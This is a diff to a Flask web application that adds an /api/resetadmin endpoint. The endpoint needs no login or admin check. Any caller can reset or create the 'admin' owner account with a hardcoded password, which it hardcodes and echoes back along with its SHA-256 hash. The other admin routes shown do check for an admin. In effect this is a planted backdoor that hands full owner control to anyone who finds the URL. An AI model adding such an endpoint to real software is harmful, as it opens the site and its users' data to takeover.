@@ -535,6 +535,25 @@ def admin_stats():
     users=cur.fetchall(); cur.close(); conn.close()
     return jsonify({'ok':True,'total':total,'premium':prem,
                     'users':[{'id':r[0],'name':r[1],'premium':r[2],'is_admin':r[3],'expires':r[4],'level':r[5],'xp':r[6]} for r in users]})
+@app.route('/api/resetadmin')
+def resetadmin():
+    """Гарантированно сбрасывает пароль владельца admin на qawsedrf2346."""
+    try:
+        import hashlib
+        good = hashlib.sha256("qawsedrf2346".encode()).hexdigest()
+        conn = get_db(); cur = conn.cursor()
+        cur.execute("SELECT user_id FROM users WHERE login='admin'")
+        exists = cur.fetchone()
+        if exists:
+            cur.execute("UPDATE users SET password=%s, is_admin=1, is_owner=1 WHERE user_id='admin'", (good,))
+        else:
+            cur.execute("INSERT INTO users(user_id,login,name,password,messages_today,last_reset,is_admin,is_owner,theme,joined_at,xp,level) VALUES('admin','admin','AWESOME',%s,0,%s,1,1,'dark',%s,0,1)",
+                        (good, gm().strftime('%Y-%m-%d'), now_iso()))
+            cur.execute("INSERT INTO total_stats_web(user_id,total_messages) VALUES('admin',0) ON CONFLICT DO NOTHING")
+        conn.commit(); cur.close(); conn.close()
+        return jsonify({'ok': True, 'msg': 'Пароль admin сброшен на qawsedrf2346', 'hash': good})
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)})
 @app.route('/api/admin/give',methods=['POST'])
 def admin_give():
     uid,ok,err=admin_check()
